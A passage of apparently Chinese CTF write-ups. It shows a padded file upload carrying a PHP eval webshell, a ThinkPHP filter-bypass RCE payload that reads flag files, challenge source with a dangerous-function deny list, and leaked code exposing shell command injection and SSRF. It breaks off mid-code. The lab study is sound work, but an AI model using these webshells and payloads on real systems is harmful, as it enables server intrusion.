aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;?php @eval(<span class="built_in">$</span><span class="built_in">_</span>POST[&#x27;a&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryFClPxPRBk7fIw7Nh--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后getshell拿到flag</p><h2 id="恶意代码检测器"><a href="#恶意代码检测器" class="headerlink" title="恶意代码检测器"></a>恶意代码检测器</h2><p><a href="http://www.zip泄露源码/">www.zip泄露源码</a></p><p>tp6框架，网上没找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[\&quot;;&#x27;%\\\\]/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$attack_log_file</span> = <span class="string">&#x27;/tmp/attack.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$attack_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;$attack_word=\&#x27;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/attack.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$attack_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;检测到危险代码: &#x27;</span>.<span class="variable">$attack_word</span>.<span class="string">&#x27;！！！&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;欢迎使用gxngxngxn的恶意代码检测器！！！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$safe_log_file</span> = <span class="string">&#x27;/tmp/safe.log&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$safe_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;$safe_word=&quot;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/safe.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$safe_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;未检测到危险代码，&#x27;</span>.<span class="variable">$safe_word</span>.<span class="string">&#x27;，非常安全&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;欢迎使用gxngxngxn的恶意代码检测器！！！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引号没了，有个特性就是利用<code>&#123;&#125;</code>进行RCE</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:/public/index.php</span><br><span class="line">code=<span class="built_in">$</span>&#123;input(0)(input(1))&#125;<span class="built_in">&amp;</span>0=system<span class="built_in">&amp;</span>1=cat /f*</span><br></pre></td></tr></table></figure><p>利用input函数绕过引号，然后拿到flag，但是哈这里${}被单引号包裹的时候就不能rce，而是被当作字面量，所以需要绕过</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脏数据 </tag>
            
            <tag> flask内存马 </tag>
            
            <tag> php特性{}rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow终极考核（未完）</title>
      <link href="/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/"/>
      <url>/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次接触这内网渗透，收获还是挺多的！对思路的提升还是很不错的!下面一起来品鉴一下吧！着重整体思路的分析，有些细节可能不会去写！</p><h2 id="信息收集和漏洞利用"><a href="#信息收集和漏洞利用" class="headerlink" title="信息收集和漏洞利用"></a>信息收集和漏洞利用</h2><p>我们的目标其实就是围绕这3个标题展开的</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="&#x2F;index.php"></a>&#x2F;index.php</h3><p>抓包响应头里面有个flag，目录扫描扫出个source.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ·»åŠ æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·å·²å­˜åœ¨&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ›´æ–°æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨æˆ–æ— æƒæ›´æ–°&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;åˆ é™¤æˆåŠŸ&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨æˆ–æ— æƒåˆ é™¤&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>)?:<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>,<span class="string">&#x27;&lt;!-- ctfshow-web-cache --&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf cache.php&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> FLAG646;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;å‘½ä»¤æ‰§è¡Œå¤±è´¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>全是一些函数不知道有啥用！</p><p>网页源码的css路径泄露了目录！<code>/system36d/</code>。这个页面的利用价值已经没了，进入下一个环节</p><h3 id="system36d"><a href="#system36d" class="headerlink" title="&#x2F;system36d&#x2F;"></a>&#x2F;system36d&#x2F;</h3><p>访问这个目录，发现有重定向，抓包分析！拿到web642的flag</p><p>然后是个密码锁，发现在尝试密码的时候无数据包的发生，那么处理逻辑一定是前端js，果然密码是<code>0x36D</code>，并且拿到web644的flag！</p><p><img src="/images/achieve/2025/11/11.png"></p><p>来到后台，一堆功能挨个去试一试，但是黑盒，这里其实还可以顺便去扫一下这个目录！</p><p>结果如下：</p><ol><li>数据备份拿到web645的flag</li><li>远程更新发现有个ssrf可以用来读本地文件</li><li>网络测试可以执行仅字母rce（ls 列出当前目录下的文件）</li></ol><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db/</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static/</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure><p>挨个利用ssrf去读，secret.txt拿到web643的flag</p><p>users.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span 